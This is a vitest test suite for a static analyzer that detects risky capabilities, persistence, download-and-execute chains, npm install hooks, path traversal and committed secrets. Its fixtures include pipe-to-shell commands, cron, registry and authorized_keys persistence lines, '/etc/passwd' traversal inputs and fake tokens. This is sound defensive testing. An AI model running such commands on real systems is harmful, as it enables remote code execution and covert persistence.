import { describe, expect, it } from 'vitest';
import { analyzeCode, type CodeAnalysis } from '../../src/analysis/index.js';
import { extractLocalRefs, resolveRef } from '../../src/analysis/refs.js';
import { scanFile } from '../../src/analysis/scan.js';
import { redact, scanSecretsInFile } from '../../src/analysis/secrets.js';
import type { FileRole, ScannedFile, SecretCandidate } from '../../src/analysis/types.js';
import { parseManifest } from '../../src/collectors/manifests/parse.js';

const file = (path: string, content: string, role: FileRole = 'source'): ScannedFile => ({
  path,
  content,
  size: content.length,
  role,
});
const pkg = (scripts: Record<string, string>, extra: Record<string, unknown> = {}) =>
  parseManifest(
    'package.json',
    JSON.stringify({ name: 'x', version: '1.0.0', scripts, ...extra }),
  )!;

function run(
  files: ScannedFile[],
  manifests = [] as ReturnType<typeof pkg>[],
  extraTree: string[] = [],
): CodeAnalysis {
  return analyzeCode({
    manifests,
    files,
    treePaths: [...files.map((f) => f.path), ...extraTree],
    sourceFilesTotal: files.filter((f) => f.role === 'source').length,
    fetch: { skippedTooLarge: 0, skippedOverBudget: 0 },
  });
}
const cap = (a: CodeAnalysis, name: string) =>
  a.capabilities.summary.find((c) => c.capability === name)!;

describe('capability detectors', () => {
  it('detects process, network, filesystem, eval and env use in JavaScript', () => {
    const a = run([
      file(
        'src/a.js',
        `const cp = require('child_process');\nconst x = await fetch(url);\nfs.writeFileSync('a','b');\nfs.rmSync(p);\neval(code);\nconst k = process.env.HOME;\n`,
      ),
    ]);
    for (const c of [
      'PROCESS_EXEC',
      'NETWORK_CLIENT',
      'FILESYSTEM_WRITE',
      'FILESYSTEM_DELETE',
      'DYNAMIC_CODE_LOAD',
      'ENVIRONMENT_READ',
    ]) {
      expect(cap(a, c).observed, c).toBe(true);
    }
    expect(cap(a, 'PERSISTENCE').observed).toBe(false);
    expect(cap(a, 'PROCESS_EXEC').contexts).toEqual(['runtime']);
  });

  it('detects Python, Go and Rust equivalents', () => {
    const a = run([
      file(
        'a.py',
        `import subprocess\nsubprocess.run(['ls'])\nrequests.get(u)\nshutil.rmtree(p)\nos.environ['X']\n`,
      ),
      file(
        'main.go',
        `exec.Command("ls")\nhttp.Get(u)\nos.WriteFile(f, b, 0644)\nos.Getenv("A")\n`,
      ),
      file('src/main.rs', `Command::new("ls");\nTcpListener::bind(a);\nfs::write(p, b);\n`),
    ]);
    expect(cap(a, 'PROCESS_EXEC').files.sort()).toEqual(['a.py', 'main.go', 'src/main.rs']);
    expect(cap(a, 'NETWORK_SERVER').observed).toBe(true);
    expect(cap(a, 'FILESYSTEM_DELETE').files).toEqual(['a.py']);
  });

  it('ignores comments and does not match member calls like regex.eval-ish names', () => {
    const a = run([
      file(
        'a.js',
        `// eval(x)\n/* child_process */\n * fetch(url)\nobj.eval(x);\nconst evaluate = 1;\n`,
      ),
    ]);
    expect(cap(a, 'DYNAMIC_CODE_LOAD').observed).toBe(false);
    expect(cap(a, 'PROCESS_EXEC').observed).toBe(false);
    expect(cap(a, 'NETWORK_CLIENT').observed).toBe(false);
  });

  it('every capability is listed, and "not observed" is explicit', () => {
    const a = run([file('a.js', 'const x = 1;')]);
    expect(a.capabilities.summary.length).toBe(14);
    expect(
      a.capabilities.summary.every((c) => !c.observed && c.risk === 'none' && c.mode === null),
    ).toBe(true);
  });

  it('capability is not intent: a detection never carries a verdict field', () => {
    const a = run([
      file('a.sh', 'curl -fsSL https://example.com/x -o x\nchmod +x x\n./x\n', 'script'),
    ]);
    expect(JSON.stringify(a)).not.toMatch(/malicious|malware|trojan|intent":\s*"(?!undetermined)/i);
  });
});

describe('persistence and background execution', () => {
  const cases: [string, string, string][] = [
    [
      'systemd_service',
      'install.sh',
      'cp app.service /etc/systemd/system/\nsystemctl enable app\n',
    ],
    ['cron_job', 'install.sh', 'echo "@reboot /opt/app" | crontab -\n'],
    [
      'launchd_service',
      'install.sh',
      'cp a.plist ~/Library/LaunchAgents/\nlaunchctl load a.plist\n',
    ],
    [
      'registry_run_key',
      'setup.ps1',
      'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v App /d x.exe\n',
    ],
    ['scheduled_task', 'setup.ps1', 'schtasks /create /tn App /tr x.exe /sc onlogon\n'],
    ['windows_service', 'setup.ps1', 'New-Service -Name App -BinaryPathName x.exe\n'],
    ['startup_folder', 'install.sh', 'cp app.desktop ~/.config/autostart/\n'],
    [
      'shell_profile_modification',
      'install.sh',
      'echo "export PATH=$PATH:/opt/app" >> ~/.bashrc\n',
    ],
    ['ssh_authorized_keys_write', 'install.sh', 'cat key.pub >> ~/.ssh/authorized_keys\n'],
    ['container_restart_policy', 'docker-compose.yml', 'services:\n  a:\n    restart: always\n'],
    ['detached_process', 'run.sh', 'nohup ./server &\n'],
  ];
  it.each(cases)('%s', (kind, path, content) => {
    const a = run([file(path, content, path.endsWith('.yml') ? 'config' : 'script')]);
    expect(a.persistence.kinds, kind).toContain(kind);
    expect(a.capabilities.detections.some((d) => d.persistence_kind === kind)).toBe(true);
  });

  it('plain code without those constructs shows no persistence', () => {
    const a = run([file('a.js', "console.log('service enable');\nconst cron = 1;\n")]);
    expect(a.persistence).toEqual({ observed: false, kinds: [], install_time: false });
  });

  it('JS detached spawn is a background process, not persistence by itself', () => {
    const a = run([file('a.js', "spawn('x', [], { detached: true });\n")]);
    expect(cap(a, 'BACKGROUND_PROCESS').observed).toBe(true);
    expect(a.persistence.observed).toBe(false);
    expect(a.persistence.kinds).toContain('detached_process');
  });
});

describe('download-and-execute chains', () => {
  it('curl | sh on one line is a DIRECT pipe-to-shell chain', () => {
    const a = run([
      file('install.sh', 'set -e\ncurl -fsSL https://example.com/get.sh | sudo bash\n', 'script'),
    ]);
    expect(a.execution.chains).toHaveLength(1);
    expect(a.execution.chains[0]).toMatchObject({
      kind: 'pipe-to-shell',
      mode: 'DIRECT',
      file: 'install.sh',
      lines: [2],
    });
    expect(a.execution.chains[0]!.confidence).toBeGreaterThan(0.9);
  });

  it.each([
    'wget -qO- https://x.test/i | sh',
    'iwr https://x.test/i.ps1 | iex',
    'eval "$(curl -s https://x.test/env)"',
    'bash <(curl -s https://x.test/i.sh)',
  ])('detects %s', (line) => {
    expect(run([file('i.sh', line + '\n', 'script')]).execution.chains[0]?.kind).toBe(
      'pipe-to-shell',
    );
  });

  it('download + chmod + execute across lines is INFERRED with lower confidence', () => {
    const a = run([
      file(
        'i.sh',
        'curl -o /tmp/app https://example.com/app\nchmod +x /tmp/app\n/tmp/app --init\n./app\n',
        'script',
      ),
    ]);
    const c = a.execution.chains.find((x) => x.kind === 'download-chmod-exec')!;
    expect(c.mode).toBe('INFERRED');
    expect(c.confidence).toBeLessThan(0.9);
    expect(c.steps).toEqual(['remote download', 'make executable', 'execute']);
  });

  it('a download alone, or chmod alone, is not a chain', () => {
    expect(
      run([file('a.sh', 'curl -O https://example.com/data.json\n', 'script')]).execution.chains,
    ).toEqual([]);
    expect(run([file('b.sh', 'chmod +x ./run.sh\n./run.sh\n', 'script')]).execution.chains).toEqual(
      [],
    );
  });

  it('download then extract then execute is recognised', () => {
    const a = run([
      file('i.sh', 'wget https://example.com/a.tgz\ntar xzf a.tgz\n./a/bin/run\n', 'script'),
    ]);
    expect(a.execution.chains.map((c) => c.kind)).toContain('download-extract-exec');
  });
});

describe('npm install-time execution graph', () => {
  it('traces postinstall -> script file -> download + execute with evidence', () => {
    const m = pkg({ postinstall: 'node scripts/setup.js' });
    const a = run(
      [
        file(
          'scripts/setup.js',
          `const { execSync } = require('child_process');\nexecSync('curl -fsSL https://example.com/x.sh | sh');\n`,
          'script',
        ),
      ],
      [m],
    );
    const hook = a.execution.hooks.find((h) => h.name === 'postinstall')!;
    expect(hook).toMatchObject({
      ecosystem: 'npm',
      runs_for_dependents: true,
      context: 'install',
      risk: 'high',
      analyzed: true,
    });
    expect(hook.capabilities).toContain('PROCESS_EXEC');
    expect(hook.files).toContain('scripts/setup.js');
    expect(hook.chain_ids.length).toBe(1);
    expect(a.execution.chains[0]).toMatchObject({
      kind: 'pipe-to-shell',
      file: 'scripts/setup.js',
    });
    expect(a.execution.chains[0]!.contexts).toEqual(['install']);
    expect(cap(a, 'PROCESS_EXEC').contexts).toContain('install');
    expect(
      a.execution.graph.nodes.some((n) => n.kind === 'file' && n.file === 'scripts/setup.js'),
    ).toBe(true);
    expect(a.execution.graph.edges.some((e) => e.relation === 'EXECUTES')).toBe(true);
  });

  it('follows `npm run` indirection and local imports (bounded depth, cycle-safe)', () => {
    const m = pkg({
      postinstall: 'npm run setup',
      setup: 'npm run again && node tools/a.js',
      again: 'npm run setup',
    });
    const a = run(
      [
        file('tools/a.js', "require('./b');\n", 'script'),
        file('tools/b.js', "require('child_process').spawnSync('ls');\nrequire('./a');\n", 'ref'),
      ],
      [m],
    );
    const hook = a.execution.hooks.find((h) => h.name === 'postinstall')!;
    expect(hook.files).toEqual(expect.arrayContaining(['tools/a.js', 'tools/b.js']));
    expect(hook.capabilities).toContain('PROCESS_EXEC');
  });

  it('classifies the harmless `prepare: husky` pattern as low risk and not run for dependents', () => {
    const a = run([], [pkg({ prepare: 'husky install' })]);
    const h = a.execution.hooks.find((x) => x.name === 'prepare')!;
    expect(h.risk).toBe('low');
    expect(h.runs_for_dependents).toBe(false);
  });

  it('reports hooks whose script file could not be read as not analyzed with reduced confidence', () => {
    const a = run([], [pkg({ postinstall: 'node scripts/missing.js' })], ['scripts/missing.js']);
    const h = a.execution.hooks[0]!;
    expect(h.analyzed).toBe(false);
    expect(h.unanalyzed_commands).toBeGreaterThan(0);
    expect(h.confidence).toBeLessThanOrEqual(0.5);
  });

  it('flags npx / remote package execution inside a hook without claiming a verdict', () => {
    const a = run([], [pkg({ postinstall: 'npx some-pkg --setup' })]);
    expect(a.execution.graph.edges.some((e) => e.relation === 'DOWNLOADS')).toBe(true);
  });

  it('implicit node-gyp rebuild when binding.gyp exists and no install script is set', () => {
    const a = run([], [pkg({})], ['binding.gyp']);
    expect(
      a.execution.hooks.some((h) => h.name.includes('node-gyp') && h.runs_for_dependents),
    ).toBe(true);
    expect(
      run([], [pkg({ install: 'node-gyp rebuild' })], ['binding.gyp']).execution.hooks.filter((h) =>
        h.name.includes('implicit'),
      ),
    ).toHaveLength(0);
  });

  it('non-lifecycle scripts (build, test) are not install-time hooks', () => {
    expect(
      run(
        [],
        [pkg({ build: 'tsc', test: 'vitest', start: 'node x.js', prepublishOnly: 'npm test' })],
      ).execution.hooks,
    ).toEqual([]);
  });

  it('other ecosystems: setup.py, build.rs, Dockerfile and install.sh become hooks with the right context', () => {
    const a = run([
      file('setup.py', "import subprocess\nsubprocess.call(['make'])\n", 'build'),
      file('build.rs', 'fn main(){ Command::new("cc"); }\n', 'build'),
      file('Dockerfile', 'FROM x\nRUN curl -fsSL https://x.test/a.sh | sh\n', 'build'),
      file('install.sh', 'sudo systemctl enable app\n', 'script'),
    ]);
    const by = Object.fromEntries(a.execution.hooks.map((h) => [h.name, h]));
    expect(by['setup.py']).toMatchObject({
      ecosystem: 'pypi',
      context: 'install',
      runs_for_dependents: true,
    });
    expect(by['build.rs']).toMatchObject({ ecosystem: 'cargo', context: 'build' });
    expect(by['Dockerfile']).toMatchObject({ ecosystem: 'docker', risk: 'high' });
    expect(by['install.sh']).toMatchObject({ ecosystem: 'shell', risk: 'high' });
  });

  it('caps the graph size and reports it', () => {
    const scripts: Record<string, string> = {
      postinstall: Array.from({ length: 20 }, (_, i) => `npm run s${i}`).join(' && '),
    };
    for (let i = 0; i < 20; i++)
      scripts[`s${i}`] = Array.from({ length: 20 }, (_, j) => `echo ${i}-${j}`).join(' && ');
    const a = run([], [pkg(scripts)]);
    expect(a.execution.graph.nodes.length).toBeLessThanOrEqual(300);
    expect(a.execution.graph.truncated).toBe(true);
    expect(a.scan.limits_hit.join(' ')).toMatch(/execution graph capped/);
  });
});

describe('local reference resolution', () => {
  const tree = new Set(['scripts/a.js', 'scripts/b.sh', 'lib/index.js', 'x.py']);
  it('resolves node/sh/python/./ and relative requires inside the tree only', () => {
    expect(extractLocalRefs('node scripts/a.js', 'package.json', tree)).toEqual(['scripts/a.js']);
    expect(extractLocalRefs('bash ./scripts/b.sh --x', 'package.json', tree)).toEqual([
      'scripts/b.sh',
    ]);
    expect(extractLocalRefs("const a = require('./a');", 'scripts/c.js', tree)).toEqual([
      'scripts/a.js',
    ]);
    expect(extractLocalRefs("import x from '../lib'", 'scripts/c.js', tree)).toEqual([
      'lib/index.js',
    ]);
    expect(extractLocalRefs('python3 x.py', 'package.json', tree)).toEqual(['x.py']);
  });
  it('rejects traversal, absolute paths, URLs, backslashes and files outside the tree', () => {
    for (const r of [
      '../../etc/passwd',
      '/etc/passwd',
      'https://x.test/a.js',
      'scripts\\a.js',
      'nope.js',
      '..',
    ]) {
      expect(resolveRef(r, 'scripts', tree), r).toBeUndefined();
    }
    expect(extractLocalRefs('node ../../../etc/passwd; sh /bin/sh', 'package.json', tree)).toEqual(
      [],
    );
  });
});

describe('secret scanning', () => {
  const scan = (path: string, content: string): SecretCandidate[] => {
    const out: SecretCandidate[] = [];
    scanSecretsInFile(file(path, content), out, { n: 0 });
    return out;
  };
  const fake = {
    aws: 'AKIA' + 'ABCDEFGH12345678',
    gh: 'ghp_' + 'a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q7R8',
    key: '-----BEGIN RSA PRIVATE KEY-----',
  };
  it('detects high-precision secrets and never keeps the value', () => {
    const out = scan(
      'src/config.js',
      `const a = "${fake.aws}";\nconst t = '${fake.gh}';\n${fake.key}\n`,
    );
    expect(out.map((c) => c.type)).toEqual([
      'aws-access-key-id',
      'github-token',
      'private-key-block',
    ]);
    const json = JSON.stringify(out);
    expect(json).not.toContain(fake.aws);
    expect(json).not.toContain(fake.gh.slice(4));
    expect(out[0]!.redacted).toBe('AKIA********');
    expect(out[2]!.redacted).toBe('[redacted]');
    expect(out.every((c) => c.line > 0 && c.confidence > 0.7)).toBe(true);
  });
  it('skips placeholders and downgrades test/example paths', () => {
    expect(
      scan(
        'src/a.js',
        'const k = "AKIAEXAMPLEEXAMPLE12";\npassword = "changeme-changeme-changeme"\nconst p = process.env.GITHUB_TOKEN;\n',
      ),
    ).toEqual([]);
    const t = scan('tests/fixtures/a.js', `const a = "${fake.aws}";\n`);
    expect(t[0]).toMatchObject({ in_test_or_example: true });
    expect(t[0]!.confidence).toBeLessThanOrEqual(0.4);
  });
  it('database URLs need an actual password; generic assignments are only POSSIBLE', () => {
    expect(
      scan('a.js', 'const u = "postgres://app:s3cr3tpass@db.internal:5432/x";\n')[0],
    ).toMatchObject({ type: 'database-url-with-password', redacted: '[redacted]' });
    expect(scan('a.js', 'const u = "postgres://localhost:5432/x";\n')).toEqual([]);
    const g = scan('a.js', 'const apiKey = "Zx9Qw8Er7Ty6Ui5Op4As3Df2Gh1";\n');
    expect(g[0]).toMatchObject({ type: 'generic-credential-assignment', mode: 'POSSIBLE' });
  });
  it('flags committed secret-bearing file names without reading them, ignoring examples', () => {
    const a = run([], [], []);
    expect(a.secrets.candidates).toEqual([]);
    const b = analyzeCode({
      manifests: [],
      files: [],
      treePaths: ['.env', '.env.example', 'keys/id_rsa', 'certs/server.pem', 'tests/fixtures/.env'],
      sourceFilesTotal: 0,
      fetch: { skippedTooLarge: 0, skippedOverBudget: 0 },
    });
    expect(b.secrets.candidates.map((c) => [c.file, c.type])).toEqual([
      ['.env', 'committed-env-file'],
      ['keys/id_rsa', 'key-material-file'],
      ['certs/server.pem', 'key-material-file'],
      ['tests/fixtures/.env', 'committed-env-file'],
    ]);
    expect(b.secrets.scored_count).toBe(3);
  });
  it('redact never reveals more than four characters', () => {
    expect(redact('ghp_secretsecretsecret', true)).toBe('ghp_********');
    expect(redact('whatever', false)).toBe('[redacted]');
  });
  it('secrets in workflows are found too (they are fetched anyway)', () => {
    const a = run([file('.github/workflows/ci.yml', `env:\n  T: ${fake.gh}\n`, 'workflow')]);
    expect(a.secrets.candidates[0]?.type).toBe('github-token');
    expect(a.capabilities.detections).toEqual([]);
  });
});

describe('hostile input and resource bounds', () => {
  it('very long lines are cut before matching and scanning stays fast', () => {
    const t0 = Date.now();
    const evil = [
      'curl ' + 'a '.repeat(150_000),
      'mvn '.repeat(100_000),
      'node ' + '-a '.repeat(100_000),
      '"'.repeat(300_000),
      '${{ '.repeat(50_000),
      'x'.repeat(2_000_000),
    ];
    for (const e of evil) {
      scanFile(file('evil.sh', e + '\n', 'script'));
      extractLocalRefs(e, 'package.json', new Set(['a.js']));
      scanSecretsInFile(file('evil.js', e), [], { n: 0 });
    }
    expect(Date.now() - t0).toBeLessThan(2500);
  });
  it('lines beyond the line budget are ignored and reported', () => {
    const a = run([
      file('big.sh', Array.from({ length: 7000 }, () => 'echo hi').join('\n'), 'script'),
    ]);
    expect(a.scan.limits_hit.join(' ')).toMatch(/lines truncated in big\.sh/);
  });
  it('detections are capped, counted and ordered deterministically', () => {
    const files = Array.from({ length: 100 }, (_, i) =>
      file(
        `s/f${String(i).padStart(2, '0')}.js`,
        "process.env.A;\nprocess.env.B;\nfs.writeFileSync('a','b');\neval(x);\n",
      ),
    );
    const a = run(files);
    expect(a.capabilities.detections.length).toBe(300);
    expect(a.capabilities.detections_total).toBeGreaterThan(300);
    expect(a.scan.limits_hit.join(' ')).toMatch(/detections capped/);
    expect(a.capabilities.detections[0]!.id).toBe('CAP-0001');
    expect(JSON.stringify(run(files))).toBe(JSON.stringify(a));
  });
  it('capping keeps traceable detections for every observed capability (even ones found only late)', () => {
    const noisy = Array.from({ length: 100 }, (_, i) =>
      file(
        `s/f${String(i).padStart(3, '0')}.js`,
        "process.env.A;\nprocess.env.B;\nfs.writeFileSync('a','b');\neval(x);\n",
      ),
    );
    const late = file('z/late.sh', 'sudo systemctl enable thing\n', 'script');
    const a = run([...noisy, late]);
    expect(a.capabilities.detections.length).toBe(300);
    expect(a.capabilities.detections_total).toBeGreaterThan(300);
    for (const c of a.capabilities.summary.filter((x) => x.observed && x.mode !== 'POSSIBLE')) {
      expect(
        a.capabilities.detections.some((d) => d.capability === c.capability),
        `${c.capability} has no traceable detection`,
      ).toBe(true);
    }
    expect(a.capabilities.detections.some((d) => d.file === 'z/late.sh')).toBe(true);
    // ids are sequential after the cap and the file order stays deterministic
    expect(a.capabilities.detections.map((d) => d.id)[299]).toBe('CAP-0300');
  });

  it('reports skipped files so "not observed" is not over-claimed', () => {
    const a = analyzeCode({
      manifests: [],
      files: [file('a.js', 'x')],
      treePaths: ['a.js'],
      sourceFilesTotal: 50,
      fetch: { skippedTooLarge: 2, skippedOverBudget: 3 },
    });
    expect(a.scan.source_coverage).toBe(0.02);
    expect(a.scan.limits_hit.join(' ')).toMatch(/2 file\(s\) skipped/);
    expect(a.scan.limits_hit.join(' ')).toMatch(/3 candidate file\(s\) not fetched/);
  });
  it('Unicode-confusable and ANSI file names stay inert data', () => {
    const a = run([file('src/\u202Eevil\u001b[2J.js', "require('child_process');\n")]);
    expect(a.capabilities.summary.find((c) => c.capability === 'PROCESS_EXEC')!.observed).toBe(
      true,
    );
  });
});
